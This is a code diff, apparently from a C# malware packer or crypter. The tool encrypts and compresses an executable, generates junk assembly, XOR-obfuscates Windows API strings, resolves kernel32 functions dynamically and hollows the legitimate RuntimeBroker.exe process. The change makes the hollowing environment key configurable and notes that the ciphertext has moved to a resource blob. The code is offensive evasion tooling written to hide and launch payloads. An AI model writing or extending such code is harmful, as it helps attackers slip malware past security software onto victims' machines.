@@ -335,7 +335,8 @@ END
         byte[] cipher, byte[] key, byte[] iv,
         uint compressedLen, uint originalLen,
         string fnAsm1, string fnAsm2, string fnAsm3,
-        string hollowTarget = "RuntimeBroker.exe")
+        string hollowTarget = "RuntimeBroker.exe",
+        string hollowEnvKey = "__SERO_H__")
     {
         string fnAes  = Rnd("_a");
         string fnDcmp = Rnd("_b");
@@ -361,7 +362,7 @@ END
         var sCrDc   = MakeXorStr("CreateDecompressor");
         var sDcmpS  = MakeXorStr("Decompress");
         var sClDc   = MakeXorStr("CloseDecompressor");
-        var sHKey   = MakeXorStr("__SERO_H__");
+        var sHKey   = MakeXorStr(hollowEnvKey);
         var sHVal   = MakeXorStr("1");
         var sHTgt   = MakeXorStr(hollowTarget);
         // kernel32 dynamic resolution strings
@@ -855,7 +856,8 @@ int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {
         Action<string> log,
         string?         iconPath     = null,
         LoaderMetadata? meta         = null,
-        string          hollowTarget = "RuntimeBroker.exe")
+        string          hollowTarget = "RuntimeBroker.exe",
+        string          hollowEnvKey = "__SERO_H__")
     {
         log("[*] CustomPacker: Starting...");
         byte[] raw = await File.ReadAllBytesAsync(exePath);
@@ -874,7 +876,7 @@ int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {
 
         var (asmSrc, fn1, fn2, fn3) = GenerateAsmJunk();
         string loaderSrc = GenerateLoaderSource(cipher, key, iv,
-            (uint)compressed.Length, (uint)raw.Length, fn1, fn2, fn3, hollowTarget);
+            (uint)compressed.Length, (uint)raw.Length, fn1, fn2, fn3, hollowTarget, hollowEnvKey);
         // cipher is written as a resource blob — no longer embedded in C .data section
 
         string? clPath = await Task.Run(() => FindClExe(log));
